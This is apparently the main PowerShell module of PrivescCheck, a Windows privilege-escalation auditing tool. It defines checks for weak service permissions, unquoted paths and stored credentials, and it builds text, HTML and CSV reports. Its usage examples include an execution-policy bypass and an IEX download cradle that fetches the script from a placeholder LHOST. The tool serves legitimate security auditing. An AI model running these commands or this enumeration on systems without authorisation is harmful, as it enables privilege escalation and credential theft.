$global:CachedServiceList = New-Object -TypeName System.Collections.ArrayList
$global:CachedHotFixList = New-Object -TypeName System.Collections.ArrayList
$global:CachedScheduledTaskList = New-Object -TypeName System.Collections.ArrayList
$global:ResultArrayList = New-Object -TypeName System.Collections.ArrayList
[string[]] $global:KeywordsOfInterest = "key", "passw", "secret", "pwd", "creds", "credential", "api"

function Invoke-PrivescCheck {
    <#
    .SYNOPSIS
    Enumerates common security misconfigurations that can be exploited for privilege escalation purposes.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION
    This script aims to identify security misconfigurations that are relevant for privilege escalation. It also provides some additional information that may help penetration testers to choose between several potential exploits. For example, if you find that a service is vulnerable to DLL hijacking but you can't restart it manually, you will find useful to know how often the machine is rebooted (in the case of a server). If you see that it is rebooted every night for instance, you may want to attempt an exploit.

    .PARAMETER Extended
    Set this flag to enable extended checks.

    .PARAMETER Force
    Ignore warnings.

    .PARAMETER Silent
    Don't output test results, show only the final vulnerability report.

    .PARAMETER Report
    Basename (or path + basename) of the output file report.

    .PARAMETER Format
    Select the format of the output file (e.g.: TXT, HTML or CSV).
    
    .EXAMPLE
    PS C:\Temp\> . .\PrivescCheck.ps1; Invoke-PrivescCheck 

    .EXAMPLE 
    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

    .EXAMPLE
    C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/PrivescCheck.ps1'; Invoke-PrivescCheck" 
    #>

    [CmdletBinding()] Param(
        [Switch]$Extended = $false,
        [Switch]$Force = $false,
        [Switch]$Silent = $false,
        #[String]$OutFile,
        #[ValidateSet("HTML", "CSV")][String]$OutFormat
        [String]$Report,
        [ValidateSet("TXT", "HTML", "CSV")][String[]]$Format
    )

    # Check wether the current process has admin privileges. 
    # The following check was taken from Pow*rUp.ps1
    $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if ($IsAdmin) {

        if (-not $Force) {

            Write-Warning "You are running this script as an administrator! Some checks will be automatically disabled."
            Write-Warning "You can specify the '-Force' option to disable this warning message."
            Start-Sleep -Seconds 10
        }
    }

    # The following CSV data contains all the checks
    $AllChecksCsv = @"
"Id", "File", "Command", "Params", "Category", "DisplayName", "Type", "Severity", "Description", "Format", "Extended", "RunIfAdmin"
"USER_USER", "", "Invoke-UserCheck", "", "User", "Identity", "Info", "Info", "Get the full name of the current user (domain + username) along with the associated Security Identifier (SID).", "Table", True, True
"USER_GROUPS", "", "Invoke-UserGroupsCheck", "", "User", "Non-default Groups", "Info", "Info", "List the groups the current user belongs to. Default groups are filtered out to minimize the output.", "Table", True, True
"USER_PRIVILEGES", "", "Invoke-UserPrivilegesCheck", "", "User", "Privileges", "Vuln", "High", "List the privileges that are associated to the current user's token. If any of them can be leveraged to somehow run code in the context of the SYSTEM account, it will be reported as a finding.", "Table", False, False
"USER_ENV", "", "Invoke-UserEnvCheck", "", "User", "Environment Variables", "Info", "Info", "List the environment variables of the current process and try to identify any potentially sensitive information such as passwords or API secrets. This check is simply based on keyword matching and might not be entirely reliable.", "Table", False, True
"SERVICE_INSTALLED", "", "Invoke-InstalledServicesCheck", "", "Services", "Non-default Services", "Info", "Info", "List all registered services and filter out the ones that are built into Windows. It does so by parsing the target executable's metadata.", "List", False, True
"SERVICE_PERMISSIONS", "", "Invoke-ServicesPermissionsCheck", "", "Services", "Service Permissions", "Vuln", "High", "Interact with the Service Control Manager (SCM) and check whether the current user can modify any registered service.", "List", False, False
"SERVICE_PERMISSIONS_REGISTRY", "", "Invoke-ServicesPermissionsRegistryCheck", "", "Services", "Registry Permissions", "Vuln", "High", "Parse the registry and check whether the current user can modify the configuration of any registered service.", "List", False, False
"SERVICE_IMAGE_PERMISSIONS", "", "Invoke-ServicesImagePermissionsCheck", "", "Services", "Binary Permissions", "Vuln", "High", "List all services and check whether the current user can modify the target executable or write files in its parent folder.", "List", False, False
"SERVICE_UNQUOTED_PATH", "", "Invoke-ServicesUnquotedPathCheck", "", "Services", "Unquoted Path", "Vuln", "High", "List registered services and check whether any of them is configured with an unquoted path that can be exploited.", "List", False, False
"SERVICE_SCM_PERMISSIONS", "", "Invoke-SCMPermissionsCheck", "", "Services", "SCM Permissions", "Vuln", "High", "Check whether the current user can perform any privileged actions on the Service Control Manager (SCM).", "List", False, False
"APP_INSTALLED", "", "Invoke-InstalledProgramsCheck", "", "Apps", "Non-default Apps", "Info", "Info", "Enumerate non-default and third-party applications by parsing the registry.", "Table", True, True
"APP_MODIFIABLE", "", "Invoke-ModifiableProgramsCheck", "", "Apps", "Modifiable Apps", "Vuln", "Medium", "List non-default and third-party applications and report the ones that can be modified by the current user.", "List", False, False
"APP_PROGRAMDATA", "", "Invoke-ProgramDataCheck", "", "Apps", "ProgramData folders/files", "Info", "Info", "List the non-default ProgramData folders and check whether the current user has write permissions. This check is purely informative and the results require manual analysis.", "List", True, False
"APP_STARTUP", "", "Invoke-ApplicationsOnStartupCheck", "", "Apps", "Startup Apps", "Info", "Info", "Enumerate the system-wide applications that are run on start-up.", "List", True, True
"APP_STARTUP_VULN", "", "Invoke-ApplicationsOnStartupVulnCheck", "", "Apps", "Modifiable Startup Apps", "Vuln", "Medium", "Enumerate the system-wide applications that are run on start-up and check whether they can be modified by the current user.", "List", False, False
"APP_PROCESSES", "", "Invoke-RunningProcessCheck", "", "Apps", "Running Processes", "Info", "Info", "List processes that are not owned by the current user and filter out common processes such as 'svchost.exe'.", "Table", True, True
"SCHTASKS_IMAGE_PERMISSIONS", "", "Invoke-ScheduledTasksImagePermissionsCheck", "", "Scheduled Tasks", "Binary Permissions", "Vuln", "Medium", "Enumerate the scheduled tasks that are not owned by the current user and checks whether the target binary can be modified. Note that, as a low-privileged user, it's not possible to enumerate all the scheduled tasks.", "List", False, False
"SCHTASKS_UNQUOTED_PATH", "", "Invoke-ScheduledTasksUnquotedPathCheck", "", "Scheduled Tasks", "Unquoted Path", "Vuln", "Medium", "Enumerate the scheduled tasks that are not owned by the current user and checks whether the corresponding command uses an exploitable unquoted path. Note that, as a low-privileged user, it's not possible to enumerate all the scheduled tasks.", "List", False, False
"CREDS_SAM_BKP", "", "Invoke-SamBackupFilesCheck", "", "Creds", "SAM/SYSTEM Backup Files", "Vuln", "Medium", Check whether some backup files of the SAM/SYSTEM hives were created with insecure permissions.", "List", False, False
"CREDS_UNATTEND", "", "Invoke-UnattendFilesCheck", "", "Creds", "Unattend Files", "Vuln", "Medium", "Locate 'Unattend' files and check whether they contain any clear-text credentials.", "List", False, True
"CREDS_WINLOGON", "", "Invoke-WinlogonCheck", "", "Creds", "WinLogon", "Vuln", "Medium", "Parse the Winlogon registry keys and check whether they contain any clear-text password. Entries that have an empty password field are filtered out.", "List", False, True
"CREDS_CRED_FILES", "", "Invoke-CredentialFilesCheck", "", "Creds", "Credential Files", "Info", "Info", "Enumerate the credential files that are present in the current user's HOME folder. This is purely informative.", "List", True, True
"CREDS_VAULT_CRED", "", "Invoke-VaultCredCheck", "", "Creds", "Vault Creds", "Info", "Info", "Enumerate the credentials that are saved in the current user's vault.", "List", False, True
"CREDS_VAULT_LIST", "", "Invoke-VaultListCheck", "", "Creds", "Vault List", "Info", "Info", "Enumerate the web credentials that are saved in the current user's Vault.", "List", False, True
"CREDS_GPP", "", "Invoke-GPPPasswordCheck", "", "Creds", "GPP Passwords", "Vuln", "Medium", "Locate old cached Group Policy Preference files that contain a 'cpassword' field and extract the clear-text credentials.", "List", False, True
"CREDS_PS_HIST", "", "Invoke-PowerShellHistoryCheck", "", "Creds", "PowerShell History", "Info", "Info", "Locate the current user's PowerShell history file and check whether it contains some clear-text credentials. This check is simply based on keyword matching and might not be entirely reliable.", "List", True, True
"HARDEN_UAC", "", "Invoke-UacCheck", "", "Hardening", "UAC Settings", "Info", "Info", "Retrieve the User Access Control (UAC) configuration and check whether it is enabled.", "List", True, True
"HARDEN_LSA_PROTECTION", "", "Invoke-LsaProtectionCheck", "", "Hardening", "LSA Protection (RunAsPPL)", "Info", "Info", "Checks whether LSA protection (a.k.a. RunAsPPL) is supported and enabled.", "Table", False, True
"HARDEN_CREDENTIAL_GUARD", "", "Invoke-CredentialGuardCheck", "", "Hardening", "Credential Guard", "Info", "Info", "Checks whether Credential Guard is supported and enabled.", "Table", False, True
"HARDEN_BIOS_MODE", "", "Invoke-BiosModeCheck", "", "Hardening", "UEFI & Secure Boot", "Info", "Info", "Checks whether UEFI and Secure are supported and enabled.", "Table", True, True
"HARDEN_LAPS", "", "Invoke-LapsCheck", "", "Hardening", "LAPS Settings", "Info", "Info", "Parse the registry and determine whether LAPS is configured and enabled.", "List", True, True
"HARDEN_PS_TRANSCRIPT", "", "Invoke-PowershellTranscriptionCheck", "", "Hardening", "PowerShell Transcription", "Info", "Info", "Check whether PowerShell Transcription is configured and enabled. If so, the path of the output log file will be returned.", "List", True, True
"HARDEN_BITLOCKER", "", "Invoke-BitlockerCheck", "", "Hardening", "BitLocker", "Info", "Info", "Check whether BitLocker is configured and enabled on the system drive. Note that this check will yield a false positive if another encryption software is in use.", "List", False, True
"CONFIG_PATH_FOLDERS", "", "Invoke-DllHijackingCheck", "", "Config", "PATH Folder Permissions", "Vuln", "High", "Retrieve the list of SYSTEM %PATH% folders and check whether the current user has some write permissions in any of them.", "List", False, False
"MISC_HIJACKABLE_DLL", "", "Invoke-HijackableDllsCheck", "", "Misc", "Hijackable DLLs", "Info", "Info", "List Windows services that are prone to Ghost DLL hijacking. This is particularly relevant if the current user can create files in one of the SYSTEM %PATH% folders.", "List", False, False
"CONFIG_MSI", "", "Invoke-RegistryAlwaysInstallElevatedCheck", "", "Config", "AlwaysInstallElevated", "Vuln", "High", "Check whether the 'AlwaysInstallElevated' registry keys are configured and enabled. If so any user might be able to run arbitary MSI files with SYSTEM privileges.", "List", False, False
"CONFIG_WSUS", "", "Invoke-WsusConfigCheck", "", "Config", "WSUS Configuration", "Vuln", "High", "If WSUS is in use, this check will determine whether or not it uses a secure URL. If not, it might be vulnerable to MitM attacks (c.f. 'WSUXploit' / 'WSuspicious').", "List", False, True
"CONFIG_SCCM", "", "Invoke-SccmCacheFolderCheck", "", "Config", "SCCM Cache Folder", "Info", "Info", "Checks whether the SCCM cache folder exists. Manual investigation might be required during post-exploitation.", "List", True, True
"CONFIG_SCCM_VULN", "", "Invoke-SccmCacheFolderVulnCheck", "", "Config", "SCCM Cache Folder", "Vuln", "Medium", "Checks whether the current user can browse the SCCM cache folder. If so, hardcoded credentials might be extracted from MSI package files or scripts.", "List", False, False
"NET_TCP_ENDPOINTS", "", "Invoke-TcpEndpointsCheck", "", "Network", "TCP Endpoints", "Info", "Info", "List all TCP ports that are in a LISTEN state. For each one, the corresponding process is also returned.", "Table", True, True
"NET_UDP_ENDPOINTS", "", "Invoke-UdpEndpointsCheck", "", "Network", "UDP Endpoints", "Info", "Info", "List all UDP ports that are in a LISTEN state. For each one, the corresponding process is also returned. DNS is filtered out to minimize the output.", "Table", True, True
"NET_WLAN", "", "Invoke-WlanProfilesCheck", "", "Network", "Saved Wifi Profiles", "Info", "Info", "Enumerate saved Wifi profiles and extract clear-text WEP/WPA pre-shared keys and passphrases (if applicable).", "List", True, True
"UPDATE_HISTORY", "", "Invoke-WindowsUpdateCheck", "", "Updates", "Last Windows Update Date", "Info", "Info", "Interact with the Windows Update service and determine when the system was last updated. Note that this check might be unreliable.", "Table", True, True
"UPDATE_HOTFIX", "", "Invoke-HotFixCheck", "", "Updates", "Installed Updates and Hotfixes", "Info", "Info", "Enumerate the installed updates and hotfixes by parsing the registry. If this fails, the check will fall back to the built-in 'Get-HotFix' cmdlet.", "Table", True, True
"UPDATE_HOTFIX_VULN", "", "Invoke-HotFixVulnCheck", "", "Updates", "System up to date?", "Vuln", "Medium", "Enumerate the installed updates and hotfixes and check whether a patch was applied in the last 31 days.", "List", False, True
"MISC_AVEDR", "", "Invoke-EndpointProtectionCheck", "", "Misc", "Endpoint Protection", "Info", "Info", "Enumerate installed security products (AV, EDR). This check is based on keyword matching (loaded DLLs, running processes, installed applications and registered services).", "Table", True, True
"MISC_SYSINFO", "", "Invoke-SystemInfoCheck", "", "Misc", "OS Version", "Info", "Info", "Print the detailed version number of the Operating System. If we can't get the update history, this might be useful.", "Table", True, True
"MISC_ADMINS", "", "Invoke-LocalAdminGroupCheck", "", "Misc", "Local Admin Group", "Info", "Info", "Enumerate the users and groups that belong to the local 'Administrators' group.", "Table", True, True
"MISC_HOMES", "", "Invoke-UsersHomeFolderCheck", "", "Misc", "User Home Folders", "Info", "Info", "Enumerate local HOME folders and check for potentially weak permissions.", "Table", True, False
"MISC_MACHINE_ROLE", "", "Invoke-MachineRoleCheck", "", "Misc", "Machine Role", "Info", "Info", "Simply return the machine's role. It can be either 'Workstation', 'Server' or 'Domain Controller'.", "Table", True, True
"MISC_STARTUP_EVENTS", "", "Invoke-SystemStartupHistoryCheck", "", "Misc", "System Startup History", "Info", "Info", "Retrieve the machine's startup history. This might be useful to figure out how often a server is rebooted. In the case of a workstation, such metric isn't as relevant.", "Table", True, True
"MISC_STARTUP_LAST", "", "Invoke-SystemStartupCheck", "", "Misc", "Last System Startup", "Info", "Info", "Determine the last system startup date and time based on the current tick count. Note that this might be unreliable.", "Table", True, True
"MISC_DRIVES", "", "Invoke-SystemDrivesCheck", "", "Misc", "Filesystem Drives", "Info", "Info", "List partitions, removable storage and mapped network shares.", "Table", True, True
"@

    # Reset all global ArrayLists on startup
    $global:CachedServiceList.Clear()
    $global:CachedHotFixList.Clear()
    $global:CachedScheduledTaskList.Clear()
    $global:ResultArrayList.Clear()

    $AllChecks = New-Object System.Collections.ArrayList

    # Load default checks
    $AllChecksCsv | ConvertFrom-Csv | ForEach-Object {
        [void] $AllChecks.Add($_)
    }
    
    # Load plugin scripts if any
    $AllChecks | Where-Object { $_.File -ne "" } | Select-Object -ExpandProperty File | Sort-Object -Unique | ForEach-Object {
        Write-Verbose "Plugin required: $($_)"
        $FilePath = Join-Path $ScriptLocation -ChildPath "\PrivescCheckPlugins\$($_)"
        Get-Content -Path $FilePath -ErrorAction Stop | Out-String | Invoke-Expression
    }

    $CheckCounter = 0
    $AllChecks | ForEach-Object {

        $CurrentCheck = $_

        # Get the 'RunIfAdmin' flag's value from the CSV data 
        $RunIfAdmin = [System.Convert]::ToBoolean($CurrentCheck.RunIfAdmin)

        if (($IsAdmin -and $RunIfAdmin) -or (-not $IsAdmin)) {

            # If the current user is an admin, run the check only it 'RunIfAdmin' is true.
            # If the current user is a normal user, simply run the check.

            # Get the 'Extended' flag's value from the CSV data
            $ExtendedCheck = [System.Convert]::ToBoolean($CurrentCheck.Extended)
            
            if ($Extended -or ((-not $Extended) -and (-not $ExtendedCheck))) {

                # If the 'Extended' option was specified, run the check. 
                # If the 'Extended' option was not specified, run the check only if is is not
                # marked as an "Extended" one.

                if ($Silent) {

                    # If the 'Silent' option was specified, don't print the output of the check but write a progress bar
                    # and show the name of the check which is being run.

                    $CheckCounter += 1
                    $Percentage = ($CheckCounter * 100) / ($AllChecks.Count)
                    Write-Progress -Activity "$($CurrentCheck.Category.ToUpper()) > $($CurrentCheck.DisplayName)" -PercentComplete $Percentage
                    $CheckResult = Invoke-Check -Check $CurrentCheck
                } 
                else {

                    # If the 'Silent' option was not specified, print a banner that shows some information about the 
                    # current check. Then, run the check and print the output either as a table or a list, depending on
                    # the 'Format' value in the CSV data.

                    Write-CheckBanner -Check $CurrentCheck
                    $CheckResult = Invoke-Check -Check $CurrentCheck
                    Write-CheckResult -CheckResult $CheckResult
                }
            }
        }
    }

    # Print a report on the terminal as an 'ASCII-art' table with colors using 'Write-Host'. Therefore, 
    # this will be only visible if run from a 'real' terminal.
    Write-PrivescCheckAsciiReport

    # If the 'Report' option was specified, write a report to a file using the value of this parameter 
    # as the basename (or path + basename). The extension is then determined based on the chosen 
    # format(s).
    if ($Report) {

        if (-not $Format) {

            # If a format or a format list was not specified, default to the TXT format.

            [string[]] $Format = "TXT"
        }

        $Format | ForEach-Object {

            # For each format, build the name of the output report file as BASENAME + . + EXT. Then generate the
            # report corresponding to the current format and write it to a file using the previously formatted 
            # filename.

            $ReportFileName = "$($Report.Trim()).$($_.ToLower())"
            if ($_ -eq "TXT") {
                Write-TxtReport -AllResults $ResultArrayList | Out-File $ReportFileName
            }
            elseif ($_ -eq "HTML") {
                Write-HtmlReport -AllResults $ResultArrayList | Out-File $ReportFileName
            }
            elseif ($_ -eq "CSV") {
                Write-CsvReport -AllResults $ResultArrayList | Out-File $ReportFileName
            }
            else {
                Write-Warning "`r`nReport format not implemented: $($Format.ToUpper())`r`n"
            }
        }
    }

    # If the 'Extended' mode was not specified, print a warning message, unless the 'Force' parameter 
    # was specified.
    if ((-not $Extended) -and (-not $Force) -and (-not $Silent)) {

        Write-Warning "To get more info, run this script with the option '-Extended'."
    }
}

function Invoke-Check {

    [CmdletBinding()] Param(
        [Object]$Check
    )

    $Result = Invoke-Expression -Command "$($Check.Command) $($Check.Params)"
    $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRaw" -Value $Result
    $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRawString" -Value $($Result | Format-List | Out-String)

    if ($($Check.Type -Like "vuln")) {
        if ($Result) {
            $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value "KO"
        }
        else {
            $Check.Severity = "None"
            $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value "OK"
        }
    }
    else {
        $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value "N/A"
        if (-not $Result) {
            $Check.Severity = "None"
        }
    }
    [void] $ResultArrayList.Add($Check)
    $Check
}

function Write-CheckBanner {

    [CmdletBinding()] Param(
        [Object]$Check
    )

    function Split-Description {
        Param([String]$Description)

        $DescriptionSplit = New-Object System.Collections.ArrayList
        $TempOld = ""
        $TempNew = ""
        $Description.Split(' ') | ForEach-Object {

            $TempNew = "$($TempOld) $($_)".Trim()
            if ($TempNew.Length -gt 53) {
                [void]$DescriptionSplit.Add($TempOld)
                $TempOld = "$($_)"
            }
            else {
                $TempOld = $TempNew
            }
        }
        if ($TempOld) {
            [void]$DescriptionSplit.Add($TempOld)
        }
        $DescriptionSplit
    }

    $Title = "$($Check.Category.ToUpper()) > $($Check.DisplayName)"
    if ($Title.Length -gt 46) {
        throw "Input title is too long."
    }

    $Result = ""
    $Result += "+------+------------------------------------------------+------+`r`n"
    $Result += "| TEST | $Title$(' '*(46 - $Title.Length)) | $($Check.Type.ToUpper()) |`r`n"
    $Result += "+------+------------------------------------------------+------+`r`n"
    Split-Description -Description $Check.Description | ForEach-Object {
        $Result += "| $(if ($Flag) { '    ' } else { 'DESC'; $Flag = $true }) | $($_)$(' '*(53 - ([String]$_).Length)) |`r`n"
    }
    $Result += "+------+-------------------------------------------------------+"
    $Result
}

function Write-CheckResult {

    [CmdletBinding()] Param(
        [Object]$CheckResult
    )

    if ($CheckResult.ResultRaw) {
            
        "[*] Found $(([Object[]]$CheckResult.ResultRaw).Length) result(s)."

        if ($CheckResult.Format -eq "Table") {
            $CheckResult.ResultRaw | Format-Table -AutoSize
        }
        elseif ($CheckResult.Format -eq "List") {
            $CheckResult.ResultRaw | Format-List
        }
        
    }
    else {

        # If no result was returned by the check, print a message that shows that the host is not vulnerable
        # if it's a "vuln" check or, printer a message that shows that nothing was found.

        if ($CheckResult.Type -eq "Vuln") {
            "[!] Not vulnerable."
        }
        else {
            "[!] Nothing found."
        }
    }

    "`r`n"
}

function Write-TxtReport {

    [CmdletBinding()] Param(
        [Object[]]$AllResults
    )

    $AllResults | ForEach-Object {

        Write-CheckBanner -Check $_
        Write-CheckResult -CheckResult $_
    }
}

function Write-CsvReport {

    [CmdletBinding()] Param(
        [Object[]]$AllResults
    )
    
    $AllResults | Sort-Object -Property "Category" | Select-Object "Category","DisplayName","Description","Compliance","Severity","ResultRawString" | ConvertTo-Csv -NoTypeInformation
}

function Write-HtmlReport {

    [CmdletBinding()] Param(
        [Object[]]$AllResults
    )

    $JavaScript = @"
var cells = document.getElementsByTagName('td');

for (var i=0; i<cells.length; i++) {
    if (cells[i].innerHTML == "True") {
        cells[i].style.backgroundColor = '#ff5050';
    } else if (cells[i].innerHTML == "False") {
        cells[i].style.backgroundColor = '#00ff99';
    } else if (cells[i].innerHTML == "Low") {
      cells[i].innerHTML = "<span class=\"label low\">Low</span>"
    } else if (cells[i].innerHTML == "Medium") {
      cells[i].innerHTML = "<span class=\"label medium\">Medium</span>"
    } else if (cells[i].innerHTML == "High") {
      cells[i].innerHTML = "<span class=\"label high\">High</span>"
    } else if (cells[i].innerHTML == "Info") {
      cells[i].innerHTML = "<span class=\"label info\">Info</span>"
    } else if (cells[i].innerHTML == "None") {
        cells[i].innerHTML = "<span class=\"label other\">None</span>"
    } else if (cells[i].innerHTML == "OK") {
        cells[i].innerHTML = "<span class=\"label low\">OK</span>"
    } else if (cells[i].innerHTML == "KO") {
        cells[i].innerHTML = "<span class=\"label high\">KO</span>"
    } else if (cells[i].innerHTML == "N/A") {
        cells[i].innerHTML = "<span class=\"label other\">N/A</span>"
    }
    
    // If a cell is too large, we need to make it scrollable. But 'td' elements are not 
    // scrollable so, we need make it a 'div' first and apply the 'scroll' (c.f. CSS) style to make
    // it scrollabale.
    if (cells[i].offsetHeight > 200) {
        cells[i].innerHTML = "<div class=\"scroll\">" + cells[i].innerHTML + "</div>";
        console.log("Cells height is greater than 200");
    }
}
"@

    $Css = @"
body {
    font:1.2em normal Arial,sans-serif;
    color:#34495E;
    }
      
h1 {
    text-align:center;
    text-transform:uppercase;
    letter-spacing:-2px;
    font-size:2.5em;
    margin:20px 0;
}
      
table {
    border-collapse:collapse;
    width:100%;
    border:2px solid #6699ff;
}
      
th {
    color:white;
    background:#6699ff;
    text-align:center;
    padding:5px 0;
}

td {
    text-align:center;
    padding:5px 5px 5px 5px;
}

tbody td:nth-child(3) {
    text-align:left;
}

/* Render output results with 'pre' style */
tbody td:nth-child(6) {
    white-space: pre;
    margin: 1em 0px;
    padding: .2rem .4rem;
    font-size: 87.5%;
    font-family: SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;
    text-align:left;
}
      
tbody tr:nth-child(even) {
    background:#ECF0F1;
}
      
tbody tr:hover {
    background:#BDC3C7;
    color:#FFFFFF;
}

.scroll {
    max-height: 200px;
    overflow: auto;
}

.label {
    margin: 8px;
    padding: 6px;
    display: block;
    width: 60px;
    border-radius: 5px;
}

.low {background-color: #4CAF50;} /* Green */
.info {background-color: #2196F3;} /* Blue */
.medium {background-color: #ff9800;} /* Orange */
.high {background-color: #f44336;} /* Red */
.other {background-color: #cccccc;} /* Gray */
"@

    $Html = @"
<html>
<head>
<style>
$($Css)
</style>
</head>
<body>
BODY_TO_REPLACE
<script>
$($JavaScript)
</script>
</body>
</html>
"@

    $TableHtml = $AllResults | Sort-Object -Property "Category" | ConvertTo-Html -Property "Category","DisplayName","Description","Compliance","Severity","ResultRawString" -Fragment  
    $Html = $Html.Replace("BODY_TO_REPLACE", $TableHtml)
    $Html
}

function Write-PrivescCheckAsciiReport {
    <#
    .SYNOPSIS

    Write a short report on the terminal in ASCII-art using 'Write-Host'.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Once all the checks were executed, this function writes a table in ASCII-art that summarizes the results with fancy colors. As a pentester or a system administrator, this should help you quickly spot weaknesses on the local machine.
    
    .EXAMPLE

    PS C:\> Write-PrivescCheckAsciiReport

    +-----------------------------------------------------------------------------+
    |                         ~~~ PrivescCheck Report ~~~                         |
    +----+------+-----------------------------------------------------------------+
    | OK | None | APPS > Modifiable Apps                                          |
    | OK | None | APPS > Modifiable Apps Run on Startup                           |
    | OK | None | CONFIG > SCCM Cache Folder                                      |
    | OK | None | CONFIG > WSUS Configuration                                     |
    | OK | None | CONFIG > AlwaysInstallElevated                                  |
    | NA | Info | CREDS > Credential Manager -> 3 result(s)                       |
    | NA | Info | CREDS > Credential Manager (web) -> 1 result(s)                 |
    | OK | None | CREDS > Unattend Files                                          |
    | OK | None | CREDS > WinLogon                                                |
    | OK | None | CREDS > SAM/SYSTEM Backup Files                                 |
    | OK | None | CREDS > GPP Passwords                                           |
    | OK | None | HARDENING > BitLocker                                           |
    | NA | Info | SERVICES > Non-default Services -> 41 result(s)                 |
    | NA | Info | SERVICES > Hijackable DLLs -> 2 result(s)                       |
    | OK | None | SERVICES > System's %PATH%                                      |
    | OK | None | SERVICES > Unquoted Paths                                       |
    | OK | None | SERVICES > Binary Permissions                                   |
    | OK | None | SERVICES > Permissions - SCM                                    |
    | OK | None | SERVICES > Permissions - Registry                               |
    | OK | None | UPDATES > System up to date?                                    |
    | OK | None | USER > Privileges                                               |
    | NA | Info | USER > Environment Variables                                    |
    +----+------+-----------------------------------------------------------------+

    #>

    [CmdletBinding()] Param(
        
    )

    Write-Host "+-----------------------------------------------------------------------------+"
    Write-Host "|                         ~~~ PrivescCheck Report ~~~                         |"
    Write-Host "+----+------+-----------------------------------------------------------------+"

    $ResultArrayList | Sort-Object -Property Category | ForEach-Object {

        Write-Host -NoNewline "| "
        if ($_.Type -Like "vuln") {
            if ($_.ResultRaw) {
                Write-Host -NoNewline -ForegroundColor "Red" "KO"
            }
            else {
                Write-Host -NoNewline -ForegroundColor "Green" "OK"
            }
        }
        else {
            Write-Host -NoNewline -ForegroundColor "DarkGray" "NA"
        }
        Write-Host -NoNewline " | "

        if ($_.Severity -Like "None") {
            $SeverityColor = "DarkGray"
            Write-Host -NoNewline -ForegroundColor $SeverityColor "None"
        }
        elseif ($_.Severity -Like "Low") {
            $SeverityColor = "DarkGreen"
            Write-Host -NoNewline -ForegroundColor $SeverityColor "Low "
        }
        elseif ($_.Severity -Like "Medium") {
            $SeverityColor = "DarkYellow"
            Write-Host -NoNewline -ForegroundColor $SeverityColor "Med."
        }
        elseif ($_.Severity -Like "High") {
            $SeverityColor = "DarkRed"
            Write-Host -NoNewline -ForegroundColor $SeverityColor "High"
        }
        elseif ($_.Severity -Like "Info") {
            $SeverityColor = "DarkBlue"
            Write-Host -NoNewline -ForegroundColor $SeverityColor "Info"
        }
        else {
            $SeverityColor = "White"
            Write-Host -NoNewline "    "
        }
        Write-Host -NoNewline " |"

        $Message = "$($_.Category.ToUpper()) > $($_.DisplayName)"
        if ($_.ResultRaw) {
            $Message = "$($Message) -> $(([Object[]]$_.ResultRaw).Length) result(s)"
        }
        $Padding = ' ' * $(63 - $Message.Length)

        Write-Host -NoNewline " $($_.Category.ToUpper()) > $($_.DisplayName)"
        
        if ($_.ResultRaw) {
            Write-Host -NoNewLine " ->"
            Write-Host -NoNewLine -ForegroundColor $SeverityColor " $(([Object[]]$_.ResultRaw).Length) result(s)"
        }
        
        Write-Host "$($Padding) |"
    }

    Write-Host "+----+------+-----------------------------------------------------------------+"
}